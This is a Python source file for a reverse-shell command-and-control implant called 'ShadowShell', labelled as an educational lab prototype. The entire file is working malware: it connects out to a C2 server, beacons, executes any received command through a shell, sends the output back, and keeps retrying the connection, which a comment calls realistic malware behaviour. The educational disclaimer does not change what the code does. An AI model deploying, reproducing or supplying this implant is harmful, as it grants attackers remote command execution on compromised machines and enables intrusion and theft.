import socket
import subprocess
import argparse
import time

# ShadowShell C2 Agent (Plaintext Prototype)
# Educational use only. Authorized lab testing only.

def connect_to_server(host, port):
    while True:
        try:
            # 1. Establish connection to C2 server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            # 2. Send initial beacon
            sock.send(b"ShadowShell Agent checked in. Awaiting commands.\n")
            
            # 3. Listen for commands in a loop
            while True:
                cmd = sock.recv(4096).decode('utf-8')
                
                # If server closes connection or sends exit command
                if not cmd or cmd.lower() == 'exit':
                    break
                
                # 4. Execute the command using subprocess
                try:
                    # shell=True is used for demonstration of command execution
                    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    result = output.stdout + output.stderr
                    
                    # Handle commands that return no output (like 'cd')
                    if not result:
                        result = "[*] Command executed successfully (no output).\n"
                except Exception as e:
                    result = f"[-] Error executing command: {e}\n"
                
                # 5. Send the output back to the server
                sock.send(result.encode('utf-8'))
                
        except ConnectionRefusedError:
            # If server isn't up yet, wait and retry (realistic malware behavior)
            print("[-] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] Error: {e}. Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ShadowShell C2 Agent")
    parser.add_argument("--host", default="127.0.0.1", help="C2 Server IP (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=4444, help="C2 Server Port (default: 4444)")
    args = parser.parse_args()
    
    connect_to_server(args.host, args.port)
